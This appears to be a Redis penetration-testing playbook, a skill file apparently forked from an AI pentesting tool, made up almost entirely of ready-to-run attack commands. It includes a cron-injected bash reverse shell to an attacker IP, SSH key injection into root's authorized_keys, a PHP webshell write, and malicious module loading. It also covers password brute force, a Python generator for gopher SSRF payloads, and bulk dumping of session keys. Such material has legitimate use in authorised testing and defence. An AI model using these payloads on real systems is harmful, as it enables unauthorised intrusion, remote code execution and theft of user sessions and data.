<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: redis
description: Security testing playbook for Redis covering unauthenticated access, RCE via cron/SSH key injection, SSRF-to-Redis, Lua scripting, and data extraction
---

# Redis Security Testing

Redis is a high-value target: unauthenticated by default in older versions, and if accessible leads directly to RCE via cron job injection, SSH key writing, or webshell placement. Common finding in internal networks and via SSRF.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 6379 <target> -sV --open -sC

    # Default port: 6379
    # Sentinel: 26379
    # Cluster: 7000-7005

    # Redis banner
    nc <target> 6379
    PING                    # Returns: +PONG → no auth required
    INFO server             # Returns: full server info

    # nmap redis scripts
    nmap --script redis-info,redis-brute <target> -p 6379

---

## Unauthenticated Access

    # Basic auth test
    redis-cli -h <target> -p 6379 PING
    # PONG = no authentication required

    redis-cli -h <target> INFO server      # Server info
    redis-cli -h <target> CONFIG GET *     # All configuration
    redis-cli -h <target> KEYS *           # All keys
    redis-cli -h <target> DBSIZE           # Number of keys

---

## Data Extraction

    # List all keys
    redis-cli -h <target> KEYS *
    redis-cli -h <target> KEYS "user*"
    redis-cli -h <target> KEYS "session*"
    redis-cli -h <target> KEYS "token*"

    # Get value by key
    redis-cli -h <target> GET <key>
    redis-cli -h <target> TYPE <key>       # string, hash, list, set, zset

    # Hash operations (common for sessions):
    redis-cli -h <target> HGETALL <key>    # All fields in hash
    redis-cli -h <target> HKEYS <key>

    # Scan (safer than KEYS * on large dbs)
    redis-cli -h <target> SCAN 0 COUNT 100

    # Dump all key-value pairs:
    redis-cli -h <target> --scan | while read key; do
      echo "KEY: $key"
      redis-cli -h <target> GET "$key"
    done

---

## Remote Code Execution via File Write

Redis's CONFIG SET allows changing the directory and filename for RDB/AOF saves — enabling arbitrary file write.

### Method 1: Cron Job Injection (Linux)

    redis-cli -h <target>
    CONFIG SET dir /var/spool/cron/crontabs/
    CONFIG SET dbfilename root
    SET payload "\n\n* * * * * bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\n\n"
    BGSAVE

    # Wait ~1 minute for cron to execute
    nc -lvnp 4444

### Method 2: SSH Key Injection

    # Generate SSH key pair on attacker:
    ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

    redis-cli -h <target>
    CONFIG SET dir /root/.ssh/
    CONFIG SET dbfilename authorized_keys
    SET pubkey "\n\n<contents of /tmp/redis_rsa.pub>\n\n"
    BGSAVE

    # Connect:
    ssh -i /tmp/redis_rsa root@<target>

### Method 3: Webshell (if web root is known)

    redis-cli -h <target>
    CONFIG SET dir /var/www/html/
    CONFIG SET dbfilename shell.php
    SET payload "<?php system($_GET['cmd']); ?>"
    BGSAVE

    # Access:
    curl "http://<target>/shell.php?cmd=id"

---

## RCE via Redis Module Loading (Redis 4.x+)

    # Load a malicious shared library:
    redis-cli -h <target> MODULE LOAD /path/to/malicious.so
    redis-cli -h <target> SYSTEM.EXEC "id"

    # Compile malicious module (RedisModuleSDK):
    # Tools: https://github.com/n0b0dyCN/RedisModulesSDK
    # redis-rogue-server: automated exploitation
    git clone https://github.com/n0b0dyCN/redis-rogue-server
    python3 redis-rogue-server.py --rhost <target> --lhost <attacker>

---

## RCE via Lua Scripting

    # Lua script execution (restricted but test for bypass):
    redis-cli -h <target> EVAL "return redis.call('info')" 0

    # OS command execution via Lua (Redis < 3.2.0):
    redis-cli -h <target> EVAL "return redis.call('config', 'set', 'dir', '/tmp')" 0

---

## Authentication Bypass / Brute Force

    # Test with blank auth:
    redis-cli -h <target> AUTH ""

    # Common Redis passwords:
    redis-cli -h <target> AUTH redis
    redis-cli -h <target> AUTH password
    redis-cli -h <target> AUTH 123456
    redis-cli -h <target> AUTH admin

    # Brute force with hydra:
    hydra -P /usr/share/wordlists/rockyou.txt redis://<target>

    # nmap brute:
    nmap --script redis-brute <target> -p 6379

---

## SSRF to Redis (Gopher Protocol)

If SSRF allows gopher:// protocol, you can send Redis commands through HTTP SSRF:

    # Gopher URL format for Redis commands:
    gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

    # Generate gopher payload for Redis RCE:
    python3 -c "
    import urllib.parse

    def encode_redis_cmd(*args):
        cmd = f'*{len(args)}\r\n'
        for arg in args:
            cmd += f'\${len(arg)}\r\n{arg}\r\n'
        return cmd

    # Commands to set SSH key:
    cmds = [
        encode_redis_cmd('CONFIG', 'SET', 'dir', '/root/.ssh'),
        encode_redis_cmd('CONFIG', 'SET', 'dbfilename', 'authorized_keys'),
        encode_redis_cmd('SET', 'key', '\n\nssh-rsa AAAA... attacker@host\n\n'),
        encode_redis_cmd('BGSAVE'),
    ]

    payload = ''.join(cmds)
    gopher_url = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload)
    print(gopher_url)
    "

---

## Redis Cluster Enumeration

    # Get cluster nodes
    redis-cli -h <target> CLUSTER NODES
    redis-cli -h <target> CLUSTER INFO

    # Check for replication (master/slave):
    redis-cli -h <target> INFO replication
    # slaveof = address of master node

---

## Session Data Extraction

    # Many web apps store sessions in Redis
    # PHP sessions (laravel, symfony):
    redis-cli -h <target> KEYS "laravel:*"
    redis-cli -h <target> KEYS "PHPREDIS_SESSION:*"

    # Node.js express sessions (connect-redis):
    redis-cli -h <target> KEYS "sess:*"
    redis-cli -h <target> GET "sess:<session_id>"

    # Python Flask sessions:
    redis-cli -h <target> KEYS "session:*"

    # If session data found, decode and forge:
    # JSON sessions → modify role, user_id, etc.
    # Signed sessions → need secret key

---

## Pro Tips

1. Redis without auth = immediate RCE via cron injection in most Linux environments
2. SSH key injection is more reliable than cron (instant, doesn't need cron daemon)
3. Always check `CONFIG GET dir` and `CONFIG GET dbfilename` to understand current save path
4. Redis exposed via SSRF with gopher:// is an instant RCE chain to internal systems
5. `KEYS *` on production Redis can be slow and disruptive — use `SCAN` instead
6. Session keys starting with `sess:` or `laravel:` contain serialized auth data — goldmine
7. Redis Sentinel on port 26379 often has weaker security than main Redis instance

## Summary

Redis testing = PING for no-auth check + KEYS * for data extraction + cron/SSH RCE via CONFIG SET. Unauthenticated Redis = guaranteed RCE in most Linux environments via SSH key injection or cron job. Sessions stored in Redis are extractable and often forgeable. SSRF-to-Redis via gopher:// is a classic internal escalation chain.
